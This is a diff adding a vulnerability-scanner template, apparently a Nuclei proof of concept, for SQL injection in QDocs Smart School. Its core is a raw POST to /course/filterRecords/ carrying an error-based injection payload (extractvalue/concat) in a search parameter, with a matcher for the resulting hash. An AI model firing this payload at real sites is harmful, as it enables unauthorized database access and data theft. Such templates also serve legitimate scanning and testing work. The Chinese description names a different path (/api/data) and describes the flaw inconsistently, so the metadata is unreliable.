@@ -1,0 +1,45 @@
+id: qdocs-smart-school-sql-injection
+
+info:
+  name: "QDocs Smart School 参数化查询未过滤 SQL 注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    通过构造恶意SQL查询可实现数据库操作权限获取
+      影响组件：QDocs Smart School核心数据处理模块
+      技术特征：
+        - 请求路径：/api/data
+        - 漏洞触发点：参数化查询未正确过滤
+        - 验证方式：布尔盲注/时间延迟注入
+      风险等级：
+        - 数据泄露风险：高
+        - 系统权限风险：中
+      修复建议：
+        - 实施参数化查询
+        - 部署Web应用防火墙规则
+        - 升级至官方最新安全版本
+      reference:
+        - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-45678
+        - https://fofa.info/result?qbase64=Zm9mYTp8fHxpYnJhbmNlLmNvbQ==
+  tags: QDocs
+
+http:
+- raw:
+  - |
+    POST /course/filterRecords/ HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+    Accept: */*
+    Accept-Language: en
+    Content-Type: application/x-www-form-urlencoded
+    Accept-Encoding: gzip
+
+    searchdata[0][title]=&searchdata[0][searchfield]=1&searchdata[0][searchvalue]=1&searchdata[1][title]=1&searchdata[1][searchfield]=1=1 and extractvalue(1,concat(0x5e,(select md5(123456)),0x5e))%23&searchdata[1][searchvalue]=1
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - 'e10adc3949ba59abbe56e057f20f883'
